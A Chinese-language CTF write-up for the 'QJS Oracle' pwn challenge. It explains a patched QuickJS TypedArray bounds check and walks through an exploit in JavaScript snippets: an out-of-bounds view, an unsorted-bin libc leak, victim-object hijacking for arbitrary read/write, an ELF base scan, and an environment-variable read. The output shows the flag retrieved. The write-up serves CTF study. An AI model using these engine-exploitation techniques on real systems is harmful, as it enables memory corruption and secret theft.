# QJS Oracle

```
> TPCTF 2026 · pwn · 挑战 ID `AUTHORED-E1C118F2` · 状态 solved
```

## 一句话

A remote JavaScript oracle.

## 附件

| 文件 | 大小 | sha256 |
| --- | --- | --- |
| `src/quickjs-base-bundle.tar.gz` | 1.5 MB | `a69e0f7f77c5…` |
| `src/patch.diff` | 1.1 KB | `c951d697be70…` |

## 分析与利用

FLAG：«FLAG»

分值：动态计分

### 0. 题目

远程 JavaScript oracle：

• 每行发送一个 JSON 对象 {"code": "<source>"}，服务返回脚本完成值的序列化结果；
• 同一条 TCP 连接内状态保持；
• 评测器是加固过的 QuickJS worker：没有 std/os、没有模块加载器、没有文件系统、没有子进程，64 MiB 堆，单次评测超时；
• 每条连接对应一个全新的 worker 进程，进程环境里带 per-instance secret，目标是把它取出来。

附件为 QuickJS 基线 bundle 与一个 23 行的 patch。flag 放在 worker 环境变量 QJS_CTF_FLAG 中（文件模式只是 adapter 的取 flag 方式，注入 worker 时仍是这个固定名字）。

### 1. 漏洞：显式长度 TypedArray 的越界检查

patch 修改 third_party/quickjs/src/quickjs.c 中 js_typed_array_constructor 的 argv[2] 分支（带显式 length）：

-                if ((offset + (len << size_log2)) > abuf->byte_length) {

```
+                uint64_t span;
```

...

```
+                span = len << (size_log2 >> 1);
```

+                if ((offset + span) > (uint64_t)abuf->byte_length) {

而 typed_array_init() 仍然按真实元素宽度初始化视图：

```
ta->length = len << size_log2;
```

...

```
p->u.array.count = len;
p->u.array.u.ptr = abuf->data + offset;
```

size_log2 的含义是 0→8 位、1→16 位、2→32 位、3→64 位。检查里的 size_log2 >> 1 让它变成只按一半宽度计算：

| 元素类型 | 检查跨度 | 实际跨度 | 可越界倍数 |
| --- | --- | --- | --- |
| 8-bit | len | len | 1×（无越界） |
| 16-bit | len×2 | len×2 | 1×（无越界） |
| 32-bit | len×2 | len×4 | 2× |
| 64-bit | len×2 | len×8 | 4× |

因此：

```js
const ab = new ArrayBuffer(0x4000);
const o  = new Uint32Array(ab, 0, 0x2000);  // 检查 0x4000 <= 0x4000，通过
// o 实际覆盖 [D, D+0x8000)，D = ab 的 data 指针
```

OOB 窗口就是 [D+0x4000, D+0x8000)，共 0x4000 字节。

### 2. 为什么越界元素还能正常读写

QuickJS 的 typed_array_is_oob()（pristine quickjs.c:57149）对显式长度分支创建的视图会返回 TRUE：该分支没有设置 ta->track_rab（只有“无 length”分支会设置），于是 len < ta->offset + ta->length 成立，.length、.byteLength、.byteOffset、迭代器、.set()、Object.keys() 等都会抛 TypeErrorArrayBufferOOB。

但元素快速路径在 JS_GetPropertyValue（约 8995–9104 行）中：

```
if (JS_VALUE_GET_TAG(prop) == JS_TAG_INT) {
idx = JS_VALUE_GET_INT(prop);
if (idx >= 0 && idx < p->u.array.count) {
// 直接按 class 解引用 p->u.array.u.uint32_ptr[idx] 等
}
}
```

只检查 idx < p->u.array.count，完全不调用 typed_array_is_oob()。所以只要索引是整数，o[i] / o[i] = v 就能读写窗口内任意位置。这是整个利用的原语基础。

### 3. 堆布局

QuickJS 有自己的小对象分配器：

• 4 KiB arena（JS_MALLOC_ARENA_SIZE 4096），arena 头 JSMallocArena 为 0x28 字节，块从 +0x28 开始；
• 小对象按块大小分类：16, 24, 32, 40, 48, 56, 64, 72, 80, …, 512；
• 大于 512 的分配走 libc malloc，前面套 8 字节 JSMallocLargeBlockHeader，所以 JS 数据指针 = malloc 指针 + 8，libc chunk 头在 data - 0x18。

一个 Uint8Array(abv, 0, 32) 视图对应：

• 一个 JSObject：0x48 字节（块大小 72），其中
• +0x12：class_id（JS_CLASS_UINT8_ARRAY = 23）
• +0x28：u.typed_array 指针
• +0x30：u.array.u.ptr
• +0x38：u.array.count（u32）
• 一块 72 字节的 class（n_blocks = (4096-40)/72 = 56 个/arena）。

因为 72 字节块落在 4 KiB arena 中，只要让 arena 分配到被释放的大 chunk 上，受害者 JSObject 就会出现在 OOB 窗口内。

### 4. 利用步骤

完整 payload 见 tools/exploit.js，单次评测内执行。

**4.1 制造 OOB 视图**

```js
var ab = new ArrayBuffer(0x4000);
var o  = new Uint32Array(ab, 0, 0x2000);
```

**4.2 泄露 unsorted bin**

```js
var t = new ArrayBuffer(0x4000);
var guard = new ArrayBuffer(0x4000);  // 阻止 t 与 top 合并
```

t = null;                              // 引用计数归零，立即 free

```js
var fd = o[0x1003] * 0x100000000 + o[0x1002];
```

t 的 data 在 D+0x4000，free 后：

• D+0x4000：chunk size | PREV_INUSE = 0x4011
• D+0x4008：unsorted bin fd
• D+0x4010：unsorted bin bk

两者都等于 libc main_arena 附近地址，直接落在窗口内。

**4.3 劫持受害者视图**

```js
// 分配 600 个受害者视图
for (var i = 0; i < 600; i++) victims.push(new Uint8Array(abv, 0, 32));
// 按 class_id 扫描窗口
for (var j = 0; j < 0x4000; j += 8) {
var off = 0x4000 + j;
var cid = (o[(off + 0x12) >> 2] >>> (((off + 0x12) & 3) * 8)) & 0xffff;
if (cid == 23) hits.push(off);
}
// 改写第一个命中对象的 ptr / count
o[pidx]     = (naddr - lo) / ...;   // +0x30 -> abv+0x80
o[pidx + 1] = nhi;
```

o[(h0 + 0x38) >> 2] = 0x100;         // count = 0x100

用 abv+0x80 处的标记字节 0xAB 找出被改写的受害者索引，之后该视图 victims[idx][i] 就是任意字节读写。

**4.4 libc base**

从 fd - (0x100000 + fd % 0x1000) 开始按页向下扫 \x7fELF：

```js
for (var pg = start; pg > 0x400000000000; pg -= 0x1000) {
setptr(pg);
if (rw[0]===0x7f && rw[1]===0x45 && rw[2]===0x4c && rw[3]===0x46) { base = pg; break; }
}
```

**4.5 读环境变量**

解析 ELF 头（e_phoff @ base+0x20、e_phentsize @ +0x36、e_phnum @ +0x38），遍历 program header，取可写 PT_LOAD（p_type == 1 && p_flags & 2），扫描其中的栈指针（0x7ff0...–0x7fff...）：

• 若值指向 argc（小整数）：envp = argc_addr + 8 + (argc+1)*8 + 8；
• 若值指向 envp 数组（__environ）：直接遍历。

逐个读 envp 字符串，匹配 QJS_CTF_FLAG=。

### 5. 远程接入

平台 API（https://ctfy.tsinghua.edu.cn）返回的实例：

• 服务：{{INSTANCE_HOST}}:8000（tcp，vpn）
• VPN 内解析：172.16.210.2
• WireGuard 接口：ctfy-ee82e69c96（本机 172.16.210.254）

题面写的 TLS:443 在该地址未监听；实际服务是明文 JSON-lines，直接连 8000：

```bash
python solve.py 172.16.210.2 8000
```

### 6. 本地复现

WSL Ubuntu-22.04 应用 patch 后构建：

```
cd ~/qjs_oracle
```

patch -p1 < "/mnt/d/EDGE下载/patch (7).diff"

make runner -j4

```
QJS_CTF_FLAG=«FLAG» python3 adapter/server.py \
```

--host 0.0.0.0 --port 18000 --runner build/qjs_runner

本地结果（glibc 2.35）：

```
base=776ed4c00000 phoff=64 num=14 ws=776ed4e168f0+75104 cands=4
flag=QJS_CTF_FLAG=«FLAG»
```

远程两次独立连接（libc 基址不同，ASLR）：

```
base=7a1a27036000 ... flag=QJS_CTF_FLAG=«FLAG»
base=77f35ceb4000 ... flag=QJS_CTF_FLAG=«FLAG»
```

### 7. 结果

«FLAG»

已通过两次独立连接复核；solve.py 端到端再跑一次同样返回该 flag。

### 8. 备注

• t = null 依赖 QuickJS 引用计数立即释放，不需要触发 GC；guard 分配用于阻止 top 合并。
• 0x4000 的 chunk 超过 tcache 上限（0x410），会进入 unsorted bin，正好提供 libc 指针。
• 视图被判定为 OOB 后 .length 等会抛异常，所以脚本全程只用 v[int] 访问。
• 每条连接都是新 worker，堆布局与 ASLR 都重新随机，但 groom 逻辑稳定；solve.py 失败会自动重连重试。

## 结果

- flag sha256：`b6df3e97f74b936a7c499dfc00000979b3632c96b871823538df392cfb017ba8`, `ed2dc9f265d760654dc924974a7a07e7407124f58aa81591cd7db70b60cb0008`
- 明文 flag 不入库；提交记录见 `.ctf-submissions.jsonl` 或原始 WP。

## 脚本

- `solve/solve.py`

## 待核实

- 本条目由 WP 第 36 节《QJS Oracle》与平台附件自动合成，建议人工复核 summary 与 fingerprints。
